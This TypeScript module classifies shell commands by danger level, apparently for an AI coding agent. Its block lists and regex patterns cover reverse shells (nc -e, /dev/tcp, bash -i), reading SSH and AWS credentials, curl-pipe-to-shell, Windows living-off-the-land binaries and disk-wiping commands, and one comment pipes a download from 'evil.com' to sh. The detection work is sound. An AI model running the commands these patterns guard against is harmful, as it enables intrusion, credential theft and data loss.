/**
 * Command Safety Module
 * Analyzes shell commands for potential dangers and provides safety levels
 */

import { getI18n } from '../../i18n';
import { isWindows } from '../../utils/platform';
import { isReadOnlyCommand } from './readOnlyDetector';

export type DangerLevel = 'safe' | 'warn' | 'danger' | 'block';

export interface CommandAnalysis {
  level: DangerLevel;
  reason: string;
  matchedPattern?: string;
  /** Whether the command is read-only (no side effects). Used for concurrency safety and UI hints. */
  readOnly: boolean;
}

export interface ConfirmationInfo {
  command: string;
  level: DangerLevel;
  reason: string;
}

/**
 * Normalize command to detect obfuscation attempts
 * This helps catch bypass techniques like extra spaces, backslashes, etc.
 */
function normalizeCommand(command: string): string {
  let normalized = command;

  // Remove backslash escapes (e.g., \rm -> rm)
  normalized = normalized.replace(/\\([a-zA-Z])/g, '$1');

  // Normalize multiple spaces to single space
  normalized = normalized.replace(/\s+/g, ' ');

  // Remove leading/trailing whitespace
  normalized = normalized.trim();

  return normalized;
}

/**
 * Check for command injection patterns
 */
function hasCommandInjection(command: string): { injected: boolean; reason: string } {
  const t = getI18n().toolResult.commandSafety;
  // Check for command chaining that might hide dangerous commands
  const injectionPatterns = [
    { pattern: /;\s*rm\s/, reason: t.injSemicolonRm },
    { pattern: /\|\s*rm\s/, reason: t.injPipeRm },
    { pattern: /&&\s*rm\s/, reason: t.injAmpRm },
    { pattern: /\|\|\s*rm\s/, reason: t.injOrRm },
    { pattern: /\$\(.*rm\s/, reason: t.injSubstRm },
    { pattern: /`.*rm\s.*`/, reason: t.injBacktickRm },
    // No blanket backtick rule: substitution alone isn't dangerous (e.g. files=`ls`); dangerous content is caught by the specific rules.
    { pattern: /;\s*sudo\s/, reason: t.injSemicolonSudo },
    { pattern: /\|\s*sudo\s/, reason: t.injPipeSudo },
    { pattern: /eval\s/, reason: t.injEvalArbitrary },
    { pattern: /\bexec\s/, reason: t.injExecReplace },
    { pattern: /source\s+\/dev\/tcp/, reason: t.injDevTcpSource },
    { pattern: /\bsource\s+<\(/, reason: t.injProcessSubstitution },
    { pattern: /bash\s+-i/, reason: t.injBashInteractive },
    { pattern: /nc\s+.*-e/, reason: t.injNcReverseShell },
    { pattern: /python.*-c.*socket/, reason: t.injPythonSocket },
    { pattern: /python.*-c.*os\.system/, reason: t.injPythonOsSystem },
    { pattern: /python.*-c.*subprocess/, reason: t.injPythonSubprocess },
    { pattern: /perl.*-e.*system/, reason: t.injPerlSystem },
    { pattern: /ruby.*-e.*system/, reason: t.injRubySystem },
    { pattern: /\$\{?IFS\}?/, reason: t.injIfsBypass },
    { pattern: /\{[a-z]+,/, reason: t.injBraceExpand },
    { pattern: /\$\{[^}]*[`$]/, reason: t.injNestedVarSubst },
    { pattern: />\s*\/dev\/tcp\//, reason: t.injDevTcpRedirect },
    { pattern: /\|\s*base64\s+-d\s*\|/, reason: t.injBase64Pipe },
    { pattern: /echo\s+.*\|\s*(ba)?sh/, reason: t.injEchoPipeShell },
    { pattern: /printf\s+.*\|\s*(ba)?sh/, reason: t.injPrintfPipeShell },
  ];

  for (const { pattern, reason } of injectionPatterns) {
    if (pattern.test(command)) {
      return { injected: true, reason };
    }
  }

  // Windows-specific injection patterns (only checked on Windows)
  if (isWindows()) {
    const winInjectionPatterns = [
      { pattern: /[&|]\s*del\s/i, reason: t.injWinPipeDel },
      { pattern: /[&|]\s*format\s/i, reason: t.injWinPipeFormat },
      { pattern: /&&\s*format\s/i, reason: t.injWinAmpFormat },
      // PowerShell semicolon-chained destructive commands (root cause of desktop deletion incident)
      { pattern: /;\s*Remove-Item\b/i, reason: t.injWinSemicolonRemoveItem },
      { pattern: /;\s*ri\b/i, reason: t.injWinSemicolonRi },
      { pattern: /;\s*erase\b/i, reason: t.injWinSemicolonErase },
      { pattern: /powershell\s+.*-enc\b/i, reason: t.injWinPsEncodedCmd },
      { pattern: /powershell\s+.*-encodedcommand\b/i, reason: t.injWinPsEncodedCmdShort },
      { pattern: /powershell\s+.*-w\s+hidden/i, reason: t.injWinPsHidden },
      { pattern: /powershell\s+.*-nop\b/i, reason: t.injWinPsNoProfile },
      { pattern: /cmd\s+\/c\s+.*del\s/i, reason: t.injWinCmdDel },
    ];
    for (const { pattern, reason } of winInjectionPatterns) {
      if (pattern.test(command)) {
        return { injected: true, reason };
      }
    }
  }

  return { injected: false, reason: '' };
}

// ── Windows-specific dangerous command patterns ──

/**
 * Windows-specific dangerous command patterns organized by severity level.
 * Returns a new object each call so that reasons are resolved at call time
 * via getI18n() (must NOT run at module load).
 */
function getWinDangerousPatterns(): Record<Exclude<DangerLevel, 'safe'>, Array<{ pattern: RegExp; reason: string }>> {
  const t = getI18n().toolResult.commandSafety;
  return {
    block: [
      { pattern: /del\s+\/s\s+\/q\s+[a-zA-Z]:\\/i, reason: t.winDelRecursiveDrive },
      { pattern: /format\s+[a-zA-Z]:/i, reason: t.winFormatDisk },
      { pattern: /reg\s+delete\s+HKLM/i, reason: t.winRegDeleteSystem },
      { pattern: />\s*\\\\\.\\PhysicalDrive/i, reason: t.winOverwritePhysicalDisk },
      { pattern: /diskpart/i, reason: t.winDiskpart },
      { pattern: /bcdedit/i, reason: t.winBcdedit },
      { pattern: /cipher\s+\/w/i, reason: t.winCipherWipe },
      { pattern: />\s*.*\\Microsoft\.PowerShell_profile\.ps1/i, reason: t.winBlockPsProfile },
      { pattern: /rundll32\s+/i, reason: t.winRundll32 },
      { pattern: /regsvcs\s+/i, reason: t.winRegsvcs },
      { pattern: /regasm\s+/i, reason: t.winRegasm },
      { pattern: /InstallUtil\s+/i, reason: t.winInstallUtil },
      { pattern: /mavinject\s+/i, reason: t.winMavinject },
      { pattern: /mshta\s+vbscript:/i, reason: t.winMshtaVbscript },
      { pattern: /mshta\s+javascript:/i, reason: t.winMshtaJavascript },
      { pattern: /fodhelper/i, reason: t.winFodhelper },
      { pattern: /certutil\s+.*-encode/i, reason: t.winCertutilEncode },
    ],
    danger: [
      { pattern: /del\s+\/s\b/i, reason: t.winDelRecursive },
      { pattern: /rmdir\s+\/s\b/i, reason: t.winRmdirRecursive },
      // PowerShell Remove-Item with -Recurse (catches the exact bug: desktop files deleted en masse)
      { pattern: /\bRemove-Item\b.*-Recurse\b/i, reason: t.winPsRemoveItemRecurse },
      { pattern: /\bRemove-Item\b.*\s-[rR]\b/i, reason: t.winPsRemoveItemRecurse },
      { pattern: /\bri\b.*-Recurse\b/i, reason: t.winPsRiRecurse },
      { pattern: /\bri\b.*\s-[rR]\b/i, reason: t.winPsRiRecurse },
      { pattern: /reg\s+delete\b/i, reason: t.winRegDelete },
      { pattern: /reg\s+export\b/i, reason: t.winRegExport },
      { pattern: /reg\s+save\b/i, reason: t.winRegSave },
      { pattern: /powershell\s+.*-executionpolicy\s+bypass/i, reason: t.winPsBypassPolicy },
      { pattern: /Invoke-WebRequest.*\|\s*iex/i, reason: t.winInvokeWebExec },
      { pattern: /Invoke-Expression/i, reason: t.winInvokeExpression },
      { pattern: /IEX\s*\(/i, reason: t.winInvokeExpression },
      { pattern: /certutil\s+.*-decode/i, reason: t.winCertutilDecode },
      { pattern: /certutil\s+.*-urlcache/i, reason: t.winCertutilUrlcache },
      { pattern: /bitsadmin\s+.*\/transfer/i, reason: t.winBitsadmin },
      { pattern: /mshta\s+/i, reason: t.winMshta },
      { pattern: /wmic\s+.*process\s+call\s+create/i, reason: t.winWmicProcessCreate },
      { pattern: /wmic\s+.*os\s+.*delete/i, reason: t.winWmicOsDelete },
      { pattern: /cscript.*\/\/e:jscript/i, reason: t.winCscriptExec },
      { pattern: /wscript.*\/\/e:jscript/i, reason: t.winWscriptExec },
      { pattern: /takeown\s+.*\/r/i, reason: t.winTakeownRecurse },
      { pattern: /icacls\s+.*\/grant.*Everyone/i, reason: t.winIcaclsGrantAll },
      { pattern: /netsh\s+.*wlan\s+.*key/i, reason: t.winNetshWlanKey },
      { pattern: /vssadmin\s+delete\s+shadows/i, reason: t.winVssDeleteShadows },
    ],
    warn: [
      { pattern: /del\s+/i, reason: t.winDelFile },
      { pattern: /rmdir\s+/i, reason: t.winRmdirDir },
      // PowerShell file deletion cmdlets and common aliases (bare, without -Recurse)
      { pattern: /\bRemove-Item\b/i, reason: t.winPsRemoveItem },
      { pattern: /\bri\b\s/i, reason: t.winPsRi },
      { pattern: /\berase\b/i, reason: t.winPsErase },
      { pattern: /\bClear-Content\b/i, reason: t.winPsClearContent },
      { pattern: /\bClear-RecycleBin\b/i, reason: t.winPsClearRecycleBin },
      { pattern: /\brunas\s+/i, reason: t.winRunas },
      { pattern: /\btaskkill\s+\/f/i, reason: t.winTaskkillForce },
      { pattern: /\bnet\s+stop\b/i, reason: t.winNetStop },
      { pattern: /\bsc\s+delete\b/i, reason: t.winScDelete },
      { pattern: /\bschtasks\s+\/delete/i, reason: t.winSchtasksDelete },
      { pattern: /\btakeown\s+/i, reason: t.winTakeown },
      { pattern: /\bicacls\s+/i, reason: t.winIcacls },
      { pattern: /\breg\s+add\b/i, reason: t.winRegAdd },
      { pattern: /\bwmic\s+/i, reason: t.winWmic },
      { pattern: /\bnetsh\s+.*firewall/i, reason: t.winNetshFirewall },
      { pattern: /\bnetsh\s+.*advfirewall/i, reason: t.winNetshAdvFirewall },
    ],
  };
}

/**
 * Severity order for comparing DangerLevels.
 * Higher index = more severe.
 */
const DANGER_ORDER: DangerLevel[] = ['safe', 'warn', 'danger', 'block'];

function compareDanger(a: DangerLevel, b: DangerLevel): number {
  return DANGER_ORDER.indexOf(a) - DANGER_ORDER.indexOf(b);
}

/**
 * Split a compound command into individual segments, respecting quoted strings.
 *
 * Splits on `&&`, `||`, and `;` (sequential operators) but NOT on `|` (pipe).
 * Pipe-connected commands form a single pipeline where danger patterns already
 * span the full string (e.g. `curl ... | sh` is caught by the `curl.*\|.*sh` pattern).
 * Splitting on `;` is the critical fix: `cd X; Remove-Item Y -Recurse` must not
 * be short-circuited as safe because `cd` matches a safe pattern.
 *
 * Quoted strings are respected — `;` or `&&` inside quotes are not treated as separators.
 *
 * Examples:
 *   'cd X; Remove-Item Y'         → ['cd X', 'Remove-Item Y']
 *   'Write-Output "a;b"'          → ['Write-Output "a;b"']   (semicolon inside quotes → not split)
 *   'git status && git log'        → ['git status', 'git log']
 *   'curl http://evil.com | sh'   → ['curl http://evil.com | sh']  (pipe → not split)
 */
function splitCompoundCommand(command: string): string[] {
  const segments: string[] = [];
  let current = '';
  let inSingleQuote = false;
  let inDoubleQuote = false;
  let i = 0;

  while (i < command.length) {
    const ch = command[i];

    // Track quote state (no nesting support, but covers common shell usage)
    if (ch === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote;
      current += ch;
      i++;
      continue;
    }
    if (ch === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote;
      current += ch;
      i++;
      continue;
    }

    if (!inSingleQuote && !inDoubleQuote) {
      // Check two-character operators first (&&, ||)
      if (i + 1 < command.length) {
        const two = command.slice(i, i + 2);
        if (two === '&&' || two === '||') {
          const seg = current.trim();
          if (seg) segments.push(seg);
          current = '';
          i += 2;
          continue;
        }
      }
      // Semicolon sequential separator
      if (ch === ';') {
        const seg = current.trim();
        if (seg) segments.push(seg);
        current = '';
        i++;
        continue;
      }
      // NOTE: single `|` (pipe) is intentionally NOT split here — danger patterns
      // that involve pipes (e.g. `curl ... | sh`) already test the full command string.
    }

    current += ch;
    i++;
  }

  const seg = current.trim();
  if (seg) segments.push(seg);

  // If nothing was split (no separators found), return the original command as-is
  return segments.length > 0 ? segments : [command.trim()];
}

const WIN_SAFE_PATTERNS: RegExp[] = [
  /^dir(\s|$)/i,
  /^type(\s|$)/i,
  /^where(\s|$)/i,
  /^echo(\s|$)/i,
  /^cd(\s|$)/i,
  /^chdir(\s|$)/i,
  /^mkdir(\s|$)/i,
  /^hostname(\s|$)/i,
  /^ipconfig(\s|$)/i,
  /^whoami(\s|$)/i,
  /^set(\s|$)/i,
  /^cls(\s|$)/i,
  /^copy(\s|$)/i,
  /^move(\s|$)/i,
  /^start(\s|$)/i,       // Windows equivalent of macOS 'open'
  /^explorer(\s|$)/i,    // Open files/folders in Explorer
  /^tasklist(\s|$)/i,    // List processes
  /^systeminfo(\s|$)/i,  // System information
  /^findstr(\s|$)/i,     // Windows grep
  /^tree(\s|$)/i,        // Directory tree
  /^more(\s|$)/i,        // Paginated view
  /^fc(\s|$)/i,          // File compare
  /^ver(\s|$)/i,         // System version
  /^path(\s|$)/i,        // View PATH
];

/**
 * Dangerous command patterns organized by severity level.
 * Returns a new object each call so that reasons are resolved at call time
 * via getI18n() (must NOT run at module load).
 */
function getDangerousPatterns(): Record<Exclude<DangerLevel, 'safe'>, Array<{ pattern: RegExp; reason: string }>> {
  const t = getI18n().toolResult.commandSafety;
  return {
    block: [
      // System-critical destructive commands
      { pattern: /rm\s+.*(-r\s+-f|-f\s+-r|-rf|-fr|--recursive)\s+\/$/, reason: t.blockRmRoot },
      { pattern: /rm\s+.*(-r\s+-f|-f\s+-r|-rf|-fr|--recursive)\s+~\/?$/, reason: t.blockRmHome },
      { pattern: /rm\s+.*(-r\s+-f|-f\s+-r|-rf|-fr|--recursive)\s+\/\*/, reason: t.blockRmRootWild },
      { pattern: /rm\s+.*(-r\s+-f|-f\s+-r|-rf|-fr|--recursive)\s+~\/\*/, reason: t.blockRmHomeWild },
      { pattern: /sudo\s+rm\s+.*(-r|-f|--recursive).*\/$/, reason: t.blockSudoRmRoot },
      { pattern: />\s*\/dev\/sd[a-z]/, reason: t.blockDdSda },
      { pattern: />\s*\/dev\/nvme/, reason: t.blockDdNvme },
      { pattern: /dd\s+.*of=\/dev\//, reason: t.blockDdDisk },
      { pattern: /mkfs\./, reason: t.blockMkfs },
      { pattern: /:\s*\(\)\s*\{/, reason: t.blockForkBomb },
      { pattern: />\s*\/dev\/null\s*2>&1\s*&/, reason: t.blockSilentBg },
      // Prevent reading/writing sensitive files via commands
      { pattern: /cat\s+.*\.ssh\/id_/, reason: t.blockCatSshKey },
      { pattern: /cat\s+.*\.aws\/credentials/, reason: t.blockCatAwsCreds },
      { pattern: />\s*.*\.ssh\/authorized_keys/, reason: t.blockWriteSshKeys },
      { pattern: />\s*.*\.bashrc/, reason: t.blockWriteShellRc },
      { pattern: />\s*.*\.zshrc/, reason: t.blockWriteShellRc },
      { pattern: />\s*.*\.profile/, reason: t.blockWriteShellRc },
    ],
    danger: [
      // Destructive but may be intentional (with various flag combinations)
      { pattern: /rm\s+.*(-r|-R|--recursive)/, reason: t.dangerRmRf },
      { pattern: /rm\s+.*\*/, reason: t.dangerRmWild },
      { pattern: /git\s+push\s+.*(-f|--force)/, reason: t.dangerGitPushForce },
      { pattern: /git\s+reset\s+--hard/, reason: t.dangerGitResetHard },
      { pattern: /git\s+clean\s+.*-f/, reason: t.dangerGitCleanF },
      { pattern: /git\s+checkout\s+--\s*\.$/, reason: t.dangerGitCheckoutDot },
      { pattern: /chmod\s+777/, reason: t.dangerChmod777 },
      { pattern: /chmod\s+-R\s+777/, reason: t.dangerChmodR777 },
      { pattern: /curl.*\|\s*(ba)?sh/, reason: t.dangerCurlPipeSh },
      { pattern: /wget.*\|\s*(ba)?sh/, reason: t.dangerCurlPipeSh },
      { pattern: /curl.*\|\s*python/, reason: t.dangerCurlPipePython },
      { pattern: /pip\s+install.*--break-system-packages/, reason: t.dangerPipBreakSystem },
      { pattern: /npm\s+.*--force/, reason: t.dangerNpmForce },
      { pattern: /bash\s+-c\s+["'].*rm\s/, reason: t.dangerBashCRm },
      { pattern: /sh\s+-c\s+["'].*rm\s/, reason: t.dangerShCRm },
      { pattern: /xargs\s+.*rm/, reason: t.dangerXargsRm },
      { pattern: /find\s+.*-delete/, reason: t.dangerFindDelete },
      { pattern: /find\s+.*-exec\s+rm/, reason: t.dangerFindExecRm },
    ],
    warn: [
      // Common commands that should be confirmed
      { pattern: /sudo\s+/, reason: t.warnSudo },
      { pattern: /rm\s+/, reason: t.warnRm },
      { pattern: /git\s+push/, reason: t.warnGitPush },
      { pattern: /npm\s+publish/, reason: t.warnNpmPublish },
      { pattern: /brew\s+uninstall/, reason: t.warnBrewUninstall },
      { pattern: /pip\s+uninstall/, reason: t.warnPipUninstall },
      { pattern: /apt\s+remove/, reason: t.warnAptRemove },
      { pattern: /apt-get\s+remove/, reason: t.warnAptRemove },
      { pattern: /apt\s+purge/, reason: t.warnAptPurge },
      { pattern: /yum\s+remove/, reason: t.warnAptRemove },
      { pattern: /dnf\s+remove/, reason: t.warnAptRemove },
      { pattern: /mv\s+.*\/dev\/null/, reason: t.warnMvDevNull },
      { pattern: /truncate\s+/, reason: t.warnTruncate },
      { pattern: /shred\s+/, reason: t.warnShred },
      { pattern: /kill\s+-9/, reason: t.warnKill9 },
      { pattern: /killall\s+/, reason: t.warnKillall },
      { pattern: /pkill\s+/, reason: t.warnPkill },
      { pattern: /systemctl\s+(stop|disable|mask)/, reason: t.warnSystemctlStop },
      { pattern: /launchctl\s+(unload|remove)/, reason: t.warnLaunchctl },
    ],
  };
}

/**
 * Safe command patterns - commands that are always allowed without confirmation
 */
const SAFE_PATTERNS: RegExp[] = [
  /^ls(\s|$)/,
  /^pwd(\s|$)/,
  /^echo(\s|$)/,
  /^cat(\s|$)/,
  /^head(\s|$)/,
  /^tail(\s|$)/,
  /^grep(\s|$)/,
  /^find(\s|$)/,
  /^rg(\s|$)/,
  /^which(\s|$)/,
  /^whoami(\s|$)/,
  /^date(\s|$)/,
  /^cd(\s|$)/,
  /^mkdir(\s|$)/,
  /^touch(\s|$)/,
  /^cp(\s|$)/,
  /^node(\s|$)/,
  /^python(\s|$)/,
  /^python3(\s|$)/,
  /^npm\s+(run|start|test|build|install|ci|list|ls|outdated)(\s|$)/,
  /^yarn\s+(run|start|test|build|install|list|outdated)(\s|$)/,
  /^pnpm\s+(run|start|test|build|install|list|outdated)(\s|$)/,
  /^bun\s+(run|start|test|build|install)(\s|$)/,
  /^git\s+(status|log|diff|branch|fetch|pull|show|stash|remote|tag)(\s|$)/,
  /^code(\s|$)/,
  /^open(\s|$)/,
];

/**
 * Analyze a single (non-compound) command segment.
 * Internal helper — does NOT split on compound operators.
 */
function analyzeSegment(segment: string): CommandAnalysis {
  const trimmed = segment.trim();
  const normalized = normalizeCommand(trimmed);
  const readOnly = isReadOnlyCommand(trimmed);

  // Build platform-aware safe pattern list
  const safePatterns = isWindows() ? [...SAFE_PATTERNS, ...WIN_SAFE_PATTERNS] : SAFE_PATTERNS;

  // Safe pattern check: only applies to the segment in isolation
  for (const pattern of safePatterns) {
    if (pattern.test(trimmed)) {
      return { level: 'safe', reason: '', readOnly };
    }
  }

  // Check dangerous patterns in descending severity order. Resolve the tiered
  // dictionaries once per segment (they rebuild their regex arrays + re-read
  // i18n on each call), not once per severity level.
  const win = isWindows();
  const dangerousPatterns = getDangerousPatterns();
  const winDangerousPatterns = win ? getWinDangerousPatterns() : null;
  const levels: Array<Exclude<DangerLevel, 'safe'>> = ['block', 'danger', 'warn'];
  for (const level of levels) {
    const patterns = winDangerousPatterns
      ? [...dangerousPatterns[level], ...winDangerousPatterns[level]]
      : dangerousPatterns[level];
    for (const { pattern, reason } of patterns) {
      if (pattern.test(trimmed) || pattern.test(normalized)) {
        return { level, reason, matchedPattern: pattern.source, readOnly: false };
      }
    }
  }

  return { level: 'safe', reason: '', readOnly };
}

/**
 * Analyze a command string and return its danger level.
 *
 * For compound commands (joined by &&, ||, ;, |), each segment is analyzed
 * independently and the highest danger level across all segments is returned.
 * This prevents safe-pattern short-circuits from masking dangerous sub-commands
 * (e.g. `cd Desktop; Remove-Item * -Recurse -Force` must NOT be classified as safe).
 */
export function analyzeCommand(command: string): CommandAnalysis {
  const trimmedCommand = command.trim();

  // Compute read-only status for the full command upfront
  const readOnly = isReadOnlyCommand(trimmedCommand);

  // Injection check runs on the full command before any splitting
  const injectionCheck = hasCommandInjection(trimmedCommand);
  if (injectionCheck.injected) {
    return { level: 'danger', reason: injectionCheck.reason, readOnly: false };
  }

  // Split into segments to prevent safe-pattern short-circuit on compound commands
  const segments = splitCompoundCommand(trimmedCommand);

  if (segments.length === 1) {
    // Single segment — use full readOnly from outer call (more accurate)
    const result = analyzeSegment(segments[0]);
    return { ...result, readOnly: result.level === 'safe' ? readOnly : false };
  }

  // Compound command: analyze each segment, return the worst result
  let worst: CommandAnalysis = { level: 'safe', reason: '', readOnly };
  for (const seg of segments) {
    const result = analyzeSegment(seg);
    if (compareDanger(result.level, worst.level) > 0) {
      worst = result;
    }
  }
  // A compound command with any dangerous segment is not read-only
  return { ...worst, readOnly: worst.level === 'safe' ? readOnly : false };
}

/**
 * Get a human-readable description for a danger level
 */
export function getDangerLevelLabel(level: DangerLevel): string {
  const t = getI18n().toolResult.commandSafety;
  switch (level) {
    case 'block':
      return t.levelBlock;
    case 'danger':
      return t.levelDanger;
    case 'warn':
      return t.levelWarn;
    case 'safe':
      return t.levelSafe;
  }
}
